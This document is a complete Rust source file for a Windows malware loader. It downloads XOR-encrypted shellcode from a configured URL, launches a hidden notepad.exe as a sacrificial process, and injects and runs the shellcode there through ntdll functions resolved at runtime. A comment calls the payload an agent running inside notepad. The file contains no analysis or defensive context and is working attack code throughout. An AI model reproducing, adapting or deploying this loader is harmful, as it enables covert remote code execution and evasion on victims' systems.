#![windows_subsystem = "windows"]
#![allow(non_snake_case, non_upper_case_globals)]

include!(concat!(env!("OUT_DIR"), "/config.rs"));

use std::{mem, ptr};

// ─── Windows primitive types ───────────────────────────────────────────────────

type BOOL      = i32;
type DWORD     = u32;
type ULONG     = u32;
type WORD      = u16;
type WCHAR     = u16;
type HANDLE    = *mut std::ffi::c_void;
type PVOID     = *mut std::ffi::c_void;
type SIZE_T    = usize;
type NTSTATUS  = i32;
type HINTERNET = *mut std::ffi::c_void;

// ─── Constants ─────────────────────────────────────────────────────────────────

const MEM_COMMIT:  DWORD = 0x1000;
const MEM_RESERVE: DWORD = 0x2000;
const MEM_RELEASE: DWORD = 0x8000;
const PAGE_READWRITE:    DWORD = 0x04;
const PAGE_EXECUTE_READ: DWORD = 0x20;
const CREATE_NO_WINDOW:          DWORD = 0x0800_0000;
const CREATE_BREAKAWAY_FROM_JOB: DWORD = 0x0100_0000;
const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: DWORD = 0;
const WINHTTP_FLAG_SECURE: DWORD = 0x0080_0000;

// ─── Structs ───────────────────────────────────────────────────────────────────

#[repr(C)]
struct STARTUPINFOA {
    cb:              DWORD,
    lpReserved:      *const u8,
    lpDesktop:       *const u8,
    lpTitle:         *const u8,
    dwX:             DWORD,
    dwY:             DWORD,
    dwXSize:         DWORD,
    dwYSize:         DWORD,
    dwXCountChars:   DWORD,
    dwYCountChars:   DWORD,
    dwFillAttribute: DWORD,
    dwFlags:         DWORD,
    wShowWindow:     WORD,
    cbReserved2:     WORD,
    lpReserved2:     *const u8,
    hStdInput:       HANDLE,
    hStdOutput:      HANDLE,
    hStdError:       HANDLE,
}

#[repr(C)]
struct PROCESS_INFORMATION {
    hProcess:    HANDLE,
    hThread:     HANDLE,
    dwProcessId: DWORD,
    dwThreadId:  DWORD,
}

// ─── ntdll function pointer types ──────────────────────────────────────────────

type FnNtAllocateVirtualMemory = unsafe extern "system" fn(
    HANDLE, *mut PVOID, usize, *mut SIZE_T, DWORD, DWORD,
) -> NTSTATUS;

type FnNtWriteVirtualMemory = unsafe extern "system" fn(
    HANDLE, PVOID, PVOID, ULONG, *mut ULONG,
) -> NTSTATUS;

type FnNtProtectVirtualMemory = unsafe extern "system" fn(
    HANDLE, *mut PVOID, *mut SIZE_T, DWORD, *mut DWORD,
) -> NTSTATUS;

type FnRtlCreateUserThread = unsafe extern "system" fn(
    HANDLE, PVOID, u8, ULONG, *mut SIZE_T, *mut SIZE_T,
    PVOID, PVOID, *mut HANDLE, PVOID,
) -> NTSTATUS;

// ─── Windows API imports ────────────────────────────────────────────────────────

extern "system" {
    fn VirtualAlloc(lpAddress: PVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD) -> PVOID;
    fn VirtualFree(lpAddress: PVOID, dwSize: SIZE_T, dwFreeType: DWORD) -> BOOL;
    fn GetModuleHandleA(lpModuleName: *const u8) -> PVOID;
    fn GetProcAddress(hModule: PVOID, lpProcName: *const u8) -> PVOID;
    fn CreateProcessA(
        lpApplicationName: *const u8,
        lpCommandLine: *mut u8,
        lpProcessAttributes: *const u8,
        lpThreadAttributes: *const u8,
        bInheritHandles: BOOL,
        dwCreationFlags: DWORD,
        lpEnvironment: *const u8,
        lpCurrentDirectory: *const u8,
        lpStartupInfo: *mut STARTUPINFOA,
        lpProcessInformation: *mut PROCESS_INFORMATION,
    ) -> BOOL;
    fn CloseHandle(hObject: HANDLE) -> BOOL;
    fn Sleep(dwMilliseconds: DWORD);

    fn WinHttpOpen(
        pszAgentW: *const WCHAR,
        dwAccessType: DWORD,
        pszProxyW: *const WCHAR,
        pszProxyBypassW: *const WCHAR,
        dwFlags: DWORD,
    ) -> HINTERNET;
    fn WinHttpConnect(
        hSession: HINTERNET,
        pswzServerName: *const WCHAR,
        nServerPort: WORD,
        dwReserved: DWORD,
    ) -> HINTERNET;
    fn WinHttpOpenRequest(
        hConnect: HINTERNET,
        pwszVerb: *const WCHAR,
        pwszObjectName: *const WCHAR,
        pwszVersion: *const WCHAR,
        pwszReferrer: *const WCHAR,
        ppwszAcceptTypes: *const *const WCHAR,
        dwFlags: DWORD,
    ) -> HINTERNET;
    fn WinHttpSendRequest(
        hRequest: HINTERNET,
        lpszHeaders: *const WCHAR,
        dwHeadersLength: DWORD,
        lpOptional: PVOID,
        dwOptionalLength: DWORD,
        dwTotalLength: DWORD,
        dwContext: usize,
    ) -> BOOL;
    fn WinHttpReceiveResponse(hRequest: HINTERNET, lpReserved: PVOID) -> BOOL;
    fn WinHttpQueryDataAvailable(hRequest: HINTERNET, lpdwNumberOfBytesAvailable: *mut DWORD) -> BOOL;
    fn WinHttpReadData(
        hRequest: HINTERNET,
        lpBuffer: *mut u8,
        dwNumberOfBytesToRead: DWORD,
        lpdwNumberOfBytesRead: *mut DWORD,
    ) -> BOOL;
    fn WinHttpCloseHandle(hInternet: HINTERNET) -> BOOL;
}

// ─── Helpers ───────────────────────────────────────────────────────────────────

fn to_wide(s: &str) -> Vec<WCHAR> {
    s.encode_utf16().chain(std::iter::once(0u16)).collect()
}

fn parse_xor_key(hex: &str) -> Vec<u8> {
    (0..hex.len())
        .step_by(2)
        .filter_map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
        .collect()
}

// Parse "http(s)://host[:port]/path" → (is_https, host_wide, port, path_wide)
fn parse_url(url: &str) -> Option<(bool, Vec<WCHAR>, WORD, Vec<WCHAR>)> {
    let is_https = url.starts_with("https://");
    let rest = url
        .strip_prefix("https://")
        .or_else(|| url.strip_prefix("http://"))?;
    let (authority, path_part) = match rest.find('/') {
        Some(i) => (&rest[..i], &rest[i..]),
        None => (rest, "/"),
    };
    let (host, port_str) = match authority.rfind(':') {
        Some(i) => (&authority[..i], &authority[i + 1..]),
        None => (authority, if is_https { "443" } else { "80" }),
    };
    let port: WORD = port_str.parse().ok()?;
    let path = if path_part.is_empty() { "/" } else { path_part };
    Some((is_https, to_wide(host), port, to_wide(path)))
}

unsafe fn download(url: &str) -> Option<Vec<u8>> {
    let (is_https, host_w, port, path_w) = parse_url(url)?;
    let flags = if is_https { WINHTTP_FLAG_SECURE } else { 0 };

    let ua = to_wide("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    let h_session = WinHttpOpen(
        ua.as_ptr(),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        ptr::null(),
        ptr::null(),
        0,
    );
    if h_session.is_null() {
        return None;
    }

    let h_connect = WinHttpConnect(h_session, host_w.as_ptr(), port, 0);
    if h_connect.is_null() {
        WinHttpCloseHandle(h_session);
        return None;
    }

    let verb = to_wide("GET");
    let h_req = WinHttpOpenRequest(
        h_connect,
        verb.as_ptr(),
        path_w.as_ptr(),
        ptr::null(),
        ptr::null(),
        ptr::null(),
        flags,
    );
    if h_req.is_null() {
        WinHttpCloseHandle(h_connect);
        WinHttpCloseHandle(h_session);
        return None;
    }

    if WinHttpSendRequest(h_req, ptr::null(), 0, ptr::null_mut(), 0, 0, 0) == 0 {
        WinHttpCloseHandle(h_req);
        WinHttpCloseHandle(h_connect);
        WinHttpCloseHandle(h_session);
        return None;
    }
    if WinHttpReceiveResponse(h_req, ptr::null_mut()) == 0 {
        WinHttpCloseHandle(h_req);
        WinHttpCloseHandle(h_connect);
        WinHttpCloseHandle(h_session);
        return None;
    }

    let mut body: Vec<u8> = Vec::new();
    loop {
        let mut avail: DWORD = 0;
        if WinHttpQueryDataAvailable(h_req, &mut avail) == 0 || avail == 0 {
            break;
        }
        let old_len = body.len();
        body.resize(old_len + avail as usize, 0u8);
        let mut nread: DWORD = 0;
        if WinHttpReadData(h_req, body.as_mut_ptr().add(old_len), avail, &mut nread) == 0 || nread == 0 {
            body.truncate(old_len);
            break;
        }
        body.truncate(old_len + nread as usize);
    }

    WinHttpCloseHandle(h_req);
    WinHttpCloseHandle(h_connect);
    WinHttpCloseHandle(h_session);

    if body.is_empty() { None } else { Some(body) }
}

// ─── Entry point ───────────────────────────────────────────────────────────────

fn main() {
    unsafe { run() }
}

unsafe fn run() {
    // 1. Decode XOR key
    let key = parse_xor_key(XOR_KEY_HEX);
    if key.is_empty() {
        return;
    }

    // 2. Download encrypted shellcode
    let mut sc = match download(PAYLOAD_URL) {
        Some(v) => v,
        None => return,
    };

    // 3. XOR decrypt in-place
    let klen = key.len();
    for (i, b) in sc.iter_mut().enumerate() {
        *b ^= key[i % klen];
    }

    // 4. Spawn sacrificial notepad.exe (breakaway from job objects)
    let notepad = b"C:\\Windows\\System32\\notepad.exe\0";
    let mut si: STARTUPINFOA = mem::zeroed();
    si.cb = mem::size_of::<STARTUPINFOA>() as DWORD;
    let mut pi: PROCESS_INFORMATION = mem::zeroed();

    let mut ok = CreateProcessA(
        notepad.as_ptr(),
        ptr::null_mut(),
        ptr::null(),
        ptr::null(),
        0,
        CREATE_NO_WINDOW | CREATE_BREAKAWAY_FROM_JOB,
        ptr::null(),
        ptr::null(),
        &mut si,
        &mut pi,
    );
    if ok == 0 {
        ok = CreateProcessA(
            notepad.as_ptr(),
            ptr::null_mut(),
            ptr::null(),
            ptr::null(),
            0,
            CREATE_NO_WINDOW,
            ptr::null(),
            ptr::null(),
            &mut si,
            &mut pi,
        );
    }
    if ok == 0 {
        VirtualFree(sc.as_mut_ptr() as PVOID, 0, MEM_RELEASE);
        return;
    }
    Sleep(500);

    // 5. Resolve ntdll functions via GetProcAddress
    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
    if ntdll.is_null() {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }
    let nt_alloc  = GetProcAddress(ntdll, b"NtAllocateVirtualMemory\0".as_ptr());
    let nt_write  = GetProcAddress(ntdll, b"NtWriteVirtualMemory\0".as_ptr());
    let nt_prot   = GetProcAddress(ntdll, b"NtProtectVirtualMemory\0".as_ptr());
    let rtl_spawn = GetProcAddress(ntdll, b"RtlCreateUserThread\0".as_ptr());
    if nt_alloc.is_null() || nt_write.is_null() || nt_prot.is_null() || rtl_spawn.is_null() {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    let NtAllocateVirtualMemory: FnNtAllocateVirtualMemory = mem::transmute(nt_alloc);
    let NtWriteVirtualMemory:    FnNtWriteVirtualMemory    = mem::transmute(nt_write);
    let NtProtectVirtualMemory:  FnNtProtectVirtualMemory  = mem::transmute(nt_prot);
    let RtlCreateUserThread:     FnRtlCreateUserThread     = mem::transmute(rtl_spawn);

    // 6. Allocate RW in remote process, write shellcode, flip to RX
    let sc_len = sc.len();
    let mut addr: PVOID = ptr::null_mut();
    let mut sz: SIZE_T  = sc_len;
    let status = NtAllocateVirtualMemory(
        pi.hProcess, &mut addr, 0, &mut sz,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
    );
    if status < 0 || addr.is_null() {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    let mut wb: ULONG = 0;
    NtWriteVirtualMemory(pi.hProcess, addr, sc.as_ptr() as PVOID, sc_len as ULONG, &mut wb);

    let mut old_prot: DWORD = 0;
    NtProtectVirtualMemory(pi.hProcess, &mut addr, &mut sz, PAGE_EXECUTE_READ, &mut old_prot);

    // 7. Spawn remote thread — agent runs independently in notepad.exe
    let mut h_thread: HANDLE = ptr::null_mut();
    RtlCreateUserThread(
        pi.hProcess,
        ptr::null_mut(),
        0u8,
        0u32,
        ptr::null_mut(),
        ptr::null_mut(),
        addr,
        ptr::null_mut(),
        &mut h_thread,
        ptr::null_mut(),
    );
    if !h_thread.is_null() {
        CloseHandle(h_thread);
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
